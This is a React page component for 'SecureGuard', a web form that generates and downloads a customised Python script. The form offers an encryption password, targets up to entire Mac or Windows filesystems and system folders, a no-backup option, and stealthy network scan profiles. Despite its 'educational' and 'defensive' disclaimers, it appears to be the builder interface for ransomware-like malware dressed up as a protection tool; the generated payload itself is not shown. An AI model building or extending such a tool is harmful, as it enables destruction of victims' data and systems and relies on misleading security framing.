import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { Shield, AlertTriangle, Settings, Info, Download, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Checkbox } from "@/components/ui/checkbox";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Label } from "@/components/ui/label";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Configuration, configurationSchema } from "@shared/schema";

export default function Home() {
  const { toast } = useToast();
  const [isGenerating, setIsGenerating] = useState(false);

  const form = useForm<Configuration>({
    resolver: zodResolver(configurationSchema),
    defaultValues: {
      password: "",
      confirmPassword: "",
      targetDir: "test",
      backupLocation: "desktop",
      scanProfile: "sneaky",
      threadCount: "15",
      excludeImages: false,
      excludeVideos: false
    }
  });

  const generateMutation = useMutation({
    mutationFn: async (config: Configuration) => {
      const response = await apiRequest("POST", "/api/generate", {
        config,
        timestamp: new Date().toISOString()
      });
      return response.blob();
    },
    onSuccess: (blob) => {
      const url = window.URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
      link.download = `secureguard_tool_${timestamp}.py`;
      document.body.appendChild(link);
      link.click();
      link.remove();
      window.URL.revokeObjectURL(url);
      
      toast({
        title: "Tool Generated Successfully!",
        description: "Your customized security tool has been downloaded.",
      });
      setIsGenerating(false);
    },
    onError: (error) => {
      toast({
        title: "Generation Failed",
        description: "Failed to generate the security tool. Please try again.",
        variant: "destructive"
      });
      setIsGenerating(false);
    }
  });

  const onSubmit = (data: Configuration) => {
    setIsGenerating(true);
    generateMutation.mutate(data);
  };

  return (
    <div className="min-h-screen security-bg text-gray-100">
      {/* Warning Banner */}
      <div className="bg-red-600 text-white py-3 px-4">
        <div className="max-w-4xl mx-auto flex items-center justify-center space-x-2">
          <AlertTriangle className="w-5 h-5" />
          <span className="font-medium">EDUCATIONAL USE ONLY - READ ALL DISCLAIMERS BEFORE PROCEEDING</span>
        </div>
      </div>

      <div className="max-w-4xl mx-auto px-4 py-8">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="flex items-center justify-center mb-4">
            <div className="bg-blue-600 p-3 rounded-full mr-4">
              <Shield className="w-8 h-8 text-white" />
            </div>
            <div>
              <h1 className="text-4xl font-bold text-white">SecureGuard</h1>
              <p className="text-gray-400 text-lg">Network Protection & Encryption Tool Generator</p>
            </div>
          </div>
          <p className="text-gray-300 max-w-2xl mx-auto">
            Generate a customized Python security tool for educational purposes, network analysis, and data protection against malicious encryption attacks.
          </p>
        </div>

        {/* Legal Disclaimer */}
        <Alert className="border-yellow-600 bg-yellow-900 mb-8">
          <AlertTriangle className="h-6 w-6 text-yellow-400" />
          <AlertDescription className="text-yellow-100">
            <h3 className="font-semibold text-lg mb-2">IMPORTANT LEGAL NOTICE</h3>
            <div className="space-y-2">
              <p>This tool is provided for <strong>educational and defensive security purposes only</strong>. By downloading and using this software, you agree to:</p>
              <ul className="list-disc list-inside space-y-1 ml-4">
                <li>Use this tool only on systems you own or have explicit permission to test</li>
                <li>Comply with all applicable local, state, and federal laws</li>
                <li>Not use this tool for malicious purposes, unauthorized access, or illegal activities</li>
                <li>Take full responsibility for your actions when using this software</li>
              </ul>
              <p className="font-medium text-yellow-200 mt-3">
                The creators of this tool are not responsible for any misuse or illegal activities performed with this software.
              </p>
            </div>
          </AlertDescription>
        </Alert>

        {/* Configuration Form */}
        <Card className="security-card border-gray-600 mb-8">
          <CardContent className="p-6">
            <h2 className="text-2xl font-semibold text-white mb-6 flex items-center">
              <Settings className="w-6 h-6 mr-3 text-blue-400" />
              Tool Configuration
            </h2>

            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                {/* Password Configuration */}
                <div className="grid md:grid-cols-2 gap-6">
                  <FormField
                    control={form.control}
                    name="password"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-gray-300">Encryption Password</FormLabel>
                        <FormControl>
                          <Input
                            type="password"
                            placeholder="Enter secure password"
                            className="bg-gray-800 border-gray-600 text-white"
                            {...field}
                          />
                        </FormControl>
                        <FormDescription className="text-gray-400">
                          This password will be used for encryption/decryption
                        </FormDescription>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                  
                  <FormField
                    control={form.control}
                    name="confirmPassword"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-gray-300">Confirm Password</FormLabel>
                        <FormControl>
                          <Input
                            type="password"
                            placeholder="Confirm password"
                            className="bg-gray-800 border-gray-600 text-white"
                            {...field}
                          />
                        </FormControl>
                        <FormDescription className="text-gray-400">
                          Re-enter the same password
                        </FormDescription>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </div>

                {/* Target Directory */}
                <div className="grid md:grid-cols-2 gap-6">
                  <FormField
                    control={form.control}
                    name="targetDir"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-gray-300">Target Directory</FormLabel>
                        <Select onValueChange={field.onChange} defaultValue={field.value}>
                          <FormControl>
                            <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
                              <SelectValue />
                            </SelectTrigger>
                          </FormControl>
                          <SelectContent className="bg-gray-800 border-gray-600">
                            <SelectItem value="test">Test Folder (~/Desktop/crypto_test)</SelectItem>
                            <SelectItem value="documents">Documents Folder (~Documents)</SelectItem>
                            <SelectItem value="desktop">Desktop Folder (~Desktop)</SelectItem>
                            <SelectItem value="downloads">Downloads Folder (~Downloads)</SelectItem>
                            <SelectItem value="home">Home Directory (~)</SelectItem>
                            <SelectItem value="mac_root">Entire Mac Filesystem (/)</SelectItem>
                            <SelectItem value="windows_root">Entire Windows Filesystem (C:\)</SelectItem>
                            <SelectItem value="mac_system">Mac System Files (/System)</SelectItem>
                            <SelectItem value="unix_system">Unix System Files (/usr)</SelectItem>
                            <SelectItem value="mac_applications">All Mac Apps (/Applications)</SelectItem>
                            <SelectItem value="mac_library">Mac System Libraries (/Library)</SelectItem>
                            <SelectItem value="windows_system">Windows System Files (C:\Windows)</SelectItem>
                            <SelectItem value="windows_programs">Windows Programs (C:\Program Files)</SelectItem>
                            <SelectItem value="windows_programs_x86">32-bit Windows Programs (C:\Program Files (x86))</SelectItem>
                          </SelectContent>
                        </Select>
                        <FormDescription className="text-gray-400">
                          Directory to scan and encrypt
                        </FormDescription>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="backupLocation"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-gray-300">Backup Location</FormLabel>
                        <Select onValueChange={field.onChange} defaultValue={field.value}>
                          <FormControl>
                            <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
                              <SelectValue />
                            </SelectTrigger>
                          </FormControl>
                          <SelectContent className="bg-gray-800 border-gray-600">
                            <SelectItem value="desktop">Desktop</SelectItem>
                            <SelectItem value="documents">Documents</SelectItem>
                            <SelectItem value="external">External Drive (/Volumes/MyUSBDrive)</SelectItem>
                            <SelectItem value="custom">Custom Location (User Input)</SelectItem>
                            <SelectItem value="none">None (No Backup)</SelectItem>
                          </SelectContent>
                        </Select>
                        <FormDescription className="text-gray-400">
                          Where to store file backups
                        </FormDescription>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </div>

                {/* Network & Timing Configuration */}
                <div className="grid md:grid-cols-2 gap-6">
                  <FormField
                    control={form.control}
                    name="scanProfile"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-gray-300">Network Scan Profile</FormLabel>
                        <Select onValueChange={field.onChange} defaultValue={field.value}>
                          <FormControl>
                            <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
                              <SelectValue />
                            </SelectTrigger>
                          </FormControl>
                          <SelectContent className="bg-gray-800 border-gray-600">
                            <SelectItem value="paranoid">Paranoid (Slowest, Most Stealthy)</SelectItem>
                            <SelectItem value="sneaky">Sneaky (Balanced)</SelectItem>
                            <SelectItem value="normal">Normal (Standard Speed)</SelectItem>
                            <SelectItem value="aggressive">Aggressive (Fastest)</SelectItem>
                          </SelectContent>
                        </Select>
                        <FormDescription className="text-gray-400">
                          Network scanning speed and stealth level
                        </FormDescription>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="threadCount"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-gray-300">Thread Count</FormLabel>
                        <Select onValueChange={field.onChange} defaultValue={field.value}>
                          <FormControl>
                            <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
                              <SelectValue />
                            </SelectTrigger>
                          </FormControl>
                          <SelectContent className="bg-gray-800 border-gray-600">
                            <SelectItem value="5">5 Threads (Conservative)</SelectItem>
                            <SelectItem value="10">10 Threads (Balanced)</SelectItem>
                            <SelectItem value="15">15 Threads (Recommended)</SelectItem>
                            <SelectItem value="20">20 Threads (Aggressive)</SelectItem>
                            <SelectItem value="30">30 Threads (Maximum)</SelectItem>
                          </SelectContent>
                        </Select>
                        <FormDescription className="text-gray-400">
                          Number of concurrent scanning threads
                        </FormDescription>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </div>

                {/* File Exclusions */}
                <div>
                  <FormLabel className="text-gray-300 mb-4 block">Optional File Exclusions</FormLabel>
                  <div className="grid grid-cols-2 gap-6">
                    <FormField
                      control={form.control}
                      name="excludeImages"
                      render={({ field }) => (
                        <FormItem className="flex items-center space-x-2">
                          <FormControl>
                            <Checkbox
                              checked={field.value}
                              onCheckedChange={field.onChange}
                            />
                          </FormControl>
                          <FormLabel className="text-sm text-gray-300">Exclude Image Files</FormLabel>
                        </FormItem>
                      )}
                    />
                    <FormField
                      control={form.control}
                      name="excludeVideos"
                      render={({ field }) => (
                        <FormItem className="flex items-center space-x-2">
                          <FormControl>
                            <Checkbox
                              checked={field.value}
                              onCheckedChange={field.onChange}
                            />
                          </FormControl>
                          <FormLabel className="text-sm text-gray-300">Exclude Video Files</FormLabel>
                        </FormItem>
                      )}
                    />
                  </div>
                  <p className="text-xs text-gray-400 mt-2">Script files (encrypt.py, decrypt.py, thekey.key) are always excluded for safety</p>
                </div>



                {/* Generate Button */}
                <div className="text-center pt-6">
                  <Button
                    type="submit"
                    disabled={isGenerating}
                    className="bg-green-600 hover:bg-green-700 text-white font-semibold py-4 px-8 rounded-lg shadow-lg"
                    size="lg"
                  >
                    {isGenerating ? (
                      <>
                        <Loader2 className="w-6 h-6 mr-3 animate-spin" />
                        Generating...
                      </>
                    ) : (
                      <>
                        <Download className="w-6 h-6 mr-3" />
                        Generate & Download Tool
                      </>
                    )}
                  </Button>
                  <p className="text-gray-400 text-sm mt-3">
                    Your customized security tool will be generated and downloaded as a Python file
                  </p>
                </div>
              </form>
            </Form>
          </CardContent>
        </Card>

        {/* Usage Instructions */}
        <Card className="bg-blue-900 border-blue-600 mb-8">
          <CardContent className="p-6">
            <h3 className="text-blue-200 font-semibold text-lg mb-3 flex items-center">
              <Info className="w-5 h-5 mr-2" />
              Usage Instructions
            </h3>
            <div className="text-blue-100 space-y-3">
              <div className="flex items-start space-x-2">
                <span className="bg-blue-600 text-white text-xs px-2 py-1 rounded-full font-medium flex-shrink-0">1</span>
                <p>Configure your preferences using the form above and set a strong encryption password</p>
              </div>
              <div className="flex items-start space-x-2">
                <span className="bg-blue-600 text-white text-xs px-2 py-1 rounded-full font-medium flex-shrink-0">2</span>
                <p>Click "Generate & Download Tool" to create your customized Python script</p>
              </div>
              <div className="flex items-start space-x-2">
                <span className="bg-blue-600 text-white text-xs px-2 py-1 rounded-full font-medium flex-shrink-0">3</span>
                <p>Run the script in a controlled environment to test network security and file protection</p>
              </div>
              <div className="flex items-start space-x-2">
                <span className="bg-blue-600 text-white text-xs px-2 py-1 rounded-full font-medium flex-shrink-0">4</span>
                <p>Use the same password to decrypt files when needed</p>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Footer */}
        <div className="mt-12 pt-8 border-t border-gray-700 text-center">
          <p className="text-gray-400 text-sm">
            © 2024 SecureGuard Educational Tool. For cybersecurity education and defensive purposes only.
          </p>
          <p className="text-gray-500 text-xs mt-2">
            Always test in isolated environments. Respect all applicable laws and regulations.
          </p>
        </div>
      </div>
    </div>
  );
}
